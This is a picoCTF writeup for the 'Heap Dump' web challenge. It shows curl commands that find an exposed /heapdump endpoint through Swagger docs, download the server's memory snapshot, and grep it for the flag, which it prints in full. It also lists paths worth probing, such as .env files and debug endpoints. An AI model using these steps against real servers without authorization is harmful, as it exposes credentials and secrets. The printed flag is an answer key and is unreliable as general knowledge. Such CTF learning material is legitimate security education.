# Heap Dump — picoCTF Writeup

## Challenge Info

| Field       | Details                                        |
|-------------|------------------------------------------------|
| Name        | Heap Dump                                      |
| Category    | Web Exploitation                               |
| Platform    | picoCTF                                        |
| URL         | `http://verbal-sleep.picoctf.net:61872/`       |

**Description:**
Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag. The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server's memory, where a secret flag is hidden.

---

## Solution

### Step 1: Explore the Website

The website is a simple blog called "picoCTF News". Looking at the main page, there are navigation links and several blog posts. One post in particular stands out — it mentions **Swagger UI** and links to an **API Documentation** page at `/api-docs`.

```bash
curl -s http://verbal-sleep.picoctf.net:61872/
```

Key detail found in the HTML:

```html
<a href="/api-docs" class="text-blue-600 hover:underline">#API Documentation</a>
```

---

### Step 2: Read the API Documentation

Visiting `/api-docs/` reveals a **Swagger UI** page — an interactive API documentation tool commonly used with Node.js/Express applications. The Swagger spec is embedded in the `swagger-ui-init.js` file.

```bash
curl -s http://verbal-sleep.picoctf.net:61872/api-docs/swagger-ui-init.js
```

The API documentation lists these endpoints:

| Endpoint     | Method | Description                        |
|--------------|--------|------------------------------------|
| `/`          | GET    | Welcome page                       |
| `/about`     | GET    | About Us                           |
| `/services`  | GET    | Services                           |
| `/heapdump`  | GET    | Diagnosing the memory allocation   |
| `/api/posts` | GET    | Get all posts                      |

The `/heapdump` endpoint immediately stands out. In Node.js applications, a **heap dump** is a snapshot of the server's memory. It captures everything currently stored in memory, including variables, strings, objects, and potentially sensitive data like secrets and flags.

---

### Step 3: Download the Heap Dump

```bash
curl -s http://verbal-sleep.picoctf.net:61872/heapdump -o heapdump
```

This downloads an 11MB file containing the Node.js V8 engine's heap snapshot.

---

### Step 4: Search for the Flag

Since a heap dump is a binary file containing all strings in memory, we can use the `strings` command to extract readable text and then search for the flag format:

```bash
strings heapdump | grep "picoCTF{"
```

**Result:**

```
picoCTF{Pat!3nt_15_Th3_K3y_dcffa92e}
```

---

## Flag

```
picoCTF{Pat!3nt_15_Th3_K3y_dcffa92e}
```

---

## Key Takeaways

1. **Always check for API documentation.** Many web applications expose Swagger UI or similar documentation at common paths like `/api-docs`, `/swagger`, or `/docs`. These can reveal hidden or undocumented endpoints.

2. **Debug/diagnostic endpoints are dangerous in production.** The `/heapdump` endpoint is a real feature used in Node.js debugging (via packages like `heapdump` or built-in `v8.writeHeapSnapshot()`). It should **never** be exposed in production, as it dumps the entire server memory — including secrets, credentials, API keys, and in this case, a flag.

3. **Use `strings` and `grep` for binary analysis.** When you have a binary file that might contain readable text (like heap dumps, memory dumps, or core files), `strings` is the fastest way to extract and search through all readable content.

4. **Explore all available endpoints.** In web CTF challenges, the flag is often behind an endpoint that isn't directly linked from the main page. API documentation, `robots.txt`, `.env` files, and common debug paths are always worth checking.
